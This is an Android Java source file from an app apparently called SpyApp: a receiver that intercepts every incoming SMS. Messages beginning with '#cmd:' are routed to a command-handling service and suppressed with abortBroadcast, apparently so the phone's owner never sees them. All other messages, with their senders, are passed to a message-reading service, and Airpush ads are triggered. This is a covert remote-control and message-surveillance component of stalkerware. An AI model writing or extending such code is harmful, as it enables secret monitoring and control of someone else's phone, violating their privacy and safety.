package com.enuke.smartapp.sms.receiver;

import android.annotation.SuppressLint;
import android.content.BroadcastReceiver;
import android.content.Context;
import android.content.Intent;
import android.os.Bundle;
import android.telephony.gsm.SmsMessage;

import com.blinkawards.utility.Utility;
import com.enuke.smartapp.SpyApp;
import com.enuke.smartapp.sms.service.CommandHandlerService;
import com.enuke.smartapp.sms.service.ReadSmsService;

@SuppressLint("DefaultLocale")
@SuppressWarnings("deprecation")
public class ReadSmsReceiver extends BroadcastReceiver {
	private Context mContext;

	@Override
	public void onReceive(Context context, Intent intent) {
		this.mContext = context;
		Bundle pudsBundle = intent.getExtras();
		Object[] pdus = (Object[]) pudsBundle.get("pdus");
		SmsMessage messages = SmsMessage.createFromPdu((byte[]) pdus[0]);
		
		final String msg = messages.getMessageBody().trim();
		final String fromMsg = messages.getDisplayOriginatingAddress();
		

		if (msg.toLowerCase().startsWith("#cmd:")) {
			Intent mIntent = new Intent(mContext, CommandHandlerService.class);
			mIntent.putExtra("mGetMessage", msg);			
			
			mIntent.putExtra("mMsgSender", fromMsg);
			mContext.startService(mIntent);
			abortBroadcast();

		} else {
			Intent mIntent = new Intent(mContext, ReadSmsService.class);
			mIntent.putExtra("mGetMessage", msg);
			mIntent.putExtra("mMsgSender", fromMsg);
		
			mContext.startService(mIntent);
			/**
			 * AirPush add during any events start code here
			 */
			new Thread(new Runnable() {
				
				@Override
				public void run() {
					try {
						Thread.sleep(5*1000);
						if(Utility.getAdaTimeDifference(mContext,true)){
							int flg=Integer.parseInt(Utility.getAdatype(mContext));
							if(flg>5)
								flg=1;
							if(flg==1){

								SpyApp.getAirpush().startSmartWallAd();
								
							}else if(flg==2){

								SpyApp.getAirpush().showRichMediaInterstitialAd();
								
							}
							else if(flg==3){

								//SpyApp.getAirpush().startIconAd();
								
							}
							else if(flg==4){

								SpyApp.getAirpush().startSmartWallAd();
								
							}else if(flg==5){

								SpyApp.getAirpush().startDialogAd();
								
							}
							Utility.setAdatype(mContext,++flg);
							
						}
						
					} catch (InterruptedException e) {
						// TODO Auto-generated catch block
						e.printStackTrace();
					}
				
					
				}
			}).start();
			/**
			 * AirPush add during any events  end code here
			 */
		}
		
	}

}
